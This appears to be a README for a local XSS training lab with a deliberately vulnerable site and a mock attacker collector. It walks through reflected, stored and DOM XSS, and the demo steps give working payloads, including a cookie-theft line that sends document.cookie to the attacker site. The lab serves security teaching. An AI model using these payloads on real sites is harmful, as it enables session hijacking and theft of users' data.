# XSS Security Demonstration Lab

## Overview
This lab demonstrates XSS vulnerabilities using two sites:

- **Port 8001**: Vulnerable Site (deliberately unsafe for XSS testing)
- **Port 8002**: Attacker Site (collects stolen data)

## Quick Start

1. **Start Lab**
   ```bash
   docker-compose up --build
   ```

2. **Install CA Certificate**
   - Install `./certs/ca.crt` in your browser to avoid SSL warnings

3. **Access Sites**
   - Vulnerable Site: https://localhost:8001
   - Attacker Site: https://localhost:8002

## Demo Flow

### Step 1: Test Reflected XSS
1. Visit https://localhost:8001
2. Use search form with payload: `<script>alert('XSS')</script>`
3. Try cookie theft: `<img src=x onerror="fetch('https://localhost:8002/steal?cookies='+document.cookie)">`

### Step 2: Test Stored XSS
1. Submit course review with XSS payload
2. Reload page to see persistent attack

### Step 3: Test DOM XSS
1. Use Contact Support form
2. Put payload in Subject field: `<img src=x onerror="alert('DOM XSS')">`
3. Click "Preview Message"

### Step 4: Monitor Stolen Data
1. Keep attacker site open: https://localhost:8002
2. Watch real-time data collection as payloads execute
3. See cookies, keystrokes, and other stolen information

## XSS Types Demonstrated
- **Reflected**: Search form echoes input without sanitization
- **Stored**: Comments stored and displayed to other users
- **DOM**: Client-side JavaScript processes user input unsafely